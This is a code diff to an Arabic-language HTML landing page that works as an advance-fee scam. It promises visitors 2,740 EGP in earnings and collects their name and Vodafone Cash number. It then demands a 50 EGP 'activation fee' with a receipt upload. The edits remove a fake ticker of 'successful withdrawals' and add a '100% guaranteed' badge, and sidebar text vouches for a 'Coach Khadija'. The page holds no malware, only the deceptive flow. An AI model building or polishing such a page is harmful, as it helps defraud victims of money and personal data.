@@ -6,9 +6,8 @@
 <title>منصة الأرباح المعتمدة</title>
 <style>
     :root {
-        --primary-color: #25d366; /* لون واتساب أخضر للثقة */
-        --secondary-color: #ffd400; /* أصفر للتميز */
-        --danger-color: #ff4d4d;
+        --primary-color: #25d366;
+        --secondary-color: #ffd400;
     }
     body {
         font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
@@ -18,70 +17,72 @@
         overflow-x: hidden;
     }
 
-    /* الشريط العلوي */
-    .top-bar {
-        background: #fff;
-        padding: 15px;
-        border-bottom: 3px solid var(--primary-color);
-        display: flex;
-        justify-content: space-between;
-        align-items: center;
-        box-shadow: 0 2px 5px rgba(0,0,0,0.1);
-    }
-    .user-meta { text-align: right; display: none; }
-    .user-meta span { color: var(--primary-color); font-weight: bold; }
-
-    /* الأشرطة الجانبية المتحركة */
+    /* تصغير النصوص الجانبية */
     .side-text {
         position: fixed;
         top: 50%;
         transform: translateY(-50%);
         background: var(--primary-color);
         color: white;
-        padding: 10px;
+        padding: 5px; /* تصغير البادينج */
         font-weight: bold;
         writing-mode: vertical-rl;
-        font-size: 14px;
+        font-size: 11px; /* تصغير الخط */
         z-index: 100;
-        border-radius: 5px;
-        box-shadow: 0 0 10px rgba(0,0,0,0.2);
+        border-radius: 3px;
+        box-shadow: 0 0 5px rgba(0,0,0,0.1);
     }
     .right-side { right: 0; }
     .left-side { left: 0; background: #c40000; }
 
-    /* الحاوية الرئيسية */
     .main-container {
-        max-width: 500px;
-        margin: 40px auto;
+        max-width: 450px;
+        margin: 20px auto;
         background: #fff;
         border-radius: 20px;
         overflow: hidden;
         box-shadow: 0 10px 25px rgba(0,0,0,0.1);
     }
+    
+    /* صورة الضمان في المنتصف */
+    .trust-badge {
+        width: 120px;
+        height: 120px;
+        background: #f9f9f9;
+        border: 2px dashed var(--primary-color);
+        border-radius: 50%;
+        margin: 20px auto;
+        display: flex;
+        align-items: center;
+        justify-content: center;
+        color: var(--primary-color);
+        font-weight: bold;
+        font-size: 14px;
+        text-align: center;
+        padding: 10px;
+    }
+
     .banner {
         background: linear-gradient(45deg, #25d366, #128c7e);
         color: white;
-        padding: 20px;
-        font-size: 20px;
+        padding: 15px;
+        font-size: 18px;
         font-weight: bold;
+        text-align: center;
     }
-    .content { padding: 30px; }
+    .content { padding: 25px; text-align: center; }
 
     input {
         width: 100%;
-        padding: 15px;
+        padding: 12px;
         margin: 10px 0;
-        border: 2px solid #eee;
-        border-radius: 10px;
+        border: 1px solid #ddd;
+        border-radius: 8px;
         box-sizing: border-box;
-        outline: none;
-        transition: 0.3s;
     }
-    input:focus { border-color: var(--primary-color); }
 
     button {
         background: var(--secondary-color);
-        color: #000;
         border: none;
         padding: 15px;
         width: 100%;
@@ -89,83 +90,55 @@
         font-size: 18px;
         font-weight: bold;
         cursor: pointer;
-        margin-top: 20px;
         box-shadow: 0 4px 0 #d4b000;
-    }
-    button:active { transform: translateY(2px); box-shadow: none; }
-
-    /* نصوص متحركة أسفل الصفحة */
-    .scrolling-footer {
-        position: fixed;
-        bottom: 0;
-        width: 100%;
-        background: #333;
-        color: #fff;
-        padding: 5px 0;
     }
 </style>
 </head>
 <body>
 
 <div class="side-text right-side">
-    <marquee direction="up" scrollamount="3">كوتش خديجة ثقة تعامل مية مية</marquee>
+    <marquee direction="up" scrollamount="2">كوتش خديجة ثقة تعامل مية مية</marquee>
 </div>
 <div class="side-text left-side">
-    <marquee direction="down" scrollamount="3">ربنا يزيدها ويبارك لها يارب</marquee>
-</div>
-
-<div class="top-bar">
-    <div id="user-info" class="user-meta">
-        <div>مرحباً: <span id="name-tag"></span></div>
-        <div>محفظة: <span id="phone-tag"></span></div>
-    </div>
-    <div style="font-weight: bold; color: #128c7e;">⭐ نظام السحب الفوري</div>
+    <marquee direction="down" scrollamount="2">ربنا يزيدها ويبارك لها يارب</marquee>
 </div>
 
 <div class="main-container">
-    <div class="banner">لوحة تحكم الأرباح</div>
+    <div class="banner">سحب الأرباح الفوري 💰</div>
     
+    <div class="trust-badge">
+        تعامل مضمون <br> 100% ✅
+    </div>
+
     <div class="content" id="step-1">
-        <h3>تسجيل بيانات المستلم</h3>
-        <input type="text" id="in-name" placeholder="أدخل اسمك كما هو في المحفظة">
-        <input type="number" id="in-phone" placeholder="أدخل رقم المحفظة">
-        <button onclick="nextStep()">دخول لنظام السحب</button>
+        <p>سجل بياناتك لاستلام 2,740 ج.م</p>
+        <input type="text" id="in-name" placeholder="الاسم الرباعي">
+        <input type="number" id="in-phone" placeholder="رقم فودافون كاش">
+        <button onclick="nextStep()">استمرار للسحب</button>
     </div>
 
     <div class="content" id="step-2" style="display: none;">
-        <h2 style="color: var(--primary-color);">تم تأكيد استحقاقك!</h2>
-        <p style="font-size: 18px;">رصيدك القابل للسحب: <b>2,740 ج.م</b></p>
-        <hr>
-        <p style="font-size: 14px; color: #666;">يرجى تحويل رسوم التفعيل (50 ج.م) وأرفق الإيصال:</p>
+        <h3 style="color:red">متبقي خطوة واحدة!</h3>
+        <p>أرسل رسوم التفعيل (50 ج) وأرفق الإيصال</p>
         <input type="file" id="file-up">
-        <button onclick="finish()">تأكيد عملية السحب</button>
+        <button onclick="finish()">تأكيد الإرسال</button>
     </div>
-</div>
-
-<div class="scrolling-footer">
-    <marquee>آخر عمليات السحب الناجحة: أحمد م. (3500ج) - سارة ع. (1200ج) - محمود ك. (5000ج) - كوتش خديجة تضمن لكم الأمان التام</marquee>
 </div>
 
 <script>
     function nextStep() {
-        const name = document.getElementById('in-name').value;
-        const phone = document.getElementById('in-phone').value;
-        if(name && phone) {
-            document.getElementById('name-tag').innerText = name;
-            document.getElementById('phone-tag').innerText = phone;
-            document.getElementById('user-info').style.display = 'block';
+        if(document.getElementById('in-name').value && document.getElementById('in-phone').value) {
             document.getElementById('step-1').style.display = 'none';
             document.getElementById('step-2').style.display = 'block';
         } else {
-            alert("برجاء إكمال البيانات");
+            alert("اكتب البيانات أولاً");
         }
     }
-
     function finish() {
         if(document.getElementById('file-up').value) {
             window.location.href = "success.html";
         } else {
-            alert("برجاء رفع صورة التحويل");
+            alert("ارفع صورة التحويل");
         }
     }
 </script>
